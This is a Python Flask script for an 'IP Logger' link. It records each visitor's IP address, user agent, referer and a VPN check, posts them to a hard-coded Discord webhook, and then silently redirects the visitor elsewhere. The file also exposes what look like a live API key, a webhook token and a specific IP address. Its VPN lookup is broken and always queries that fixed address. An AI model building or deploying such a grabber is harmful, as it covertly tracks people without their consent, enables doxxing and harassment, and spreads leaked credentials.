import requests
from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

# API URL and Token for IP Geolocation (You can replace this with your own API keys)
IPINFO_API_URL = "https://ipgeolocation.abstractapi.com/v1/?api_key=ea66e470574348f8b6fdf06ef1693280&ip_address=2a02:c7c:75f5:1300:cc1f:3b71:bf3f:d18b"
redirect_url = "https://kzrks.me"
webhook_url = "https://discord.com/api/webhooks/1325182761119514704/0wPOsxTmNCyG-v7zbvogmfxsCRFXXQaGA05CVbHAUnHsasFACnkbZRj7m9Y-oIEkGMxO"
    


def is_vpn(ip):
    response = requests.get(IPINFO_API_URL.format(ip))
    print(response.content)
    if response.status_code == 200:
        data = response.json()

        if "vpn" in data.get("org", ""):
            return True
        elif data.get("hostname") and data["hostname"].endswith(".vpn"):
            return True
    return False

def send_ip(ip, date, user_agent, referer, is_vpn):

    data = {
        "content": "",
        "title": "IP Logger",
        "embeds": [
            {
                "title": ip,
                "description": date,
                "fields": [
                    {
                        "name": "User-Agent",
                        "value": user_agent,
                        "inline": False
                    },
                    {
                        "name": "Referer",
                        "value": referer,
                        "inline": False
                    },
                    {
                        "name": "VPN Detected",
                        "value": "Yes" if is_vpn else "No",
                        "inline": False
                    }
                ]
            }
        ]
    }

    requests.post(webhook_url, json=data)

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.today().strftime("%d-%m-%Y %H:%M")
    user_agent = request.headers.get("User-Agent", "Unknown")
    referer = request.headers.get("Referer", "No Referrer")
    vpn_detected = is_vpn(ip)
    send_ip(ip, date, user_agent, referer, vpn_detected)

    return redirect(f"{redirect_url}")


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
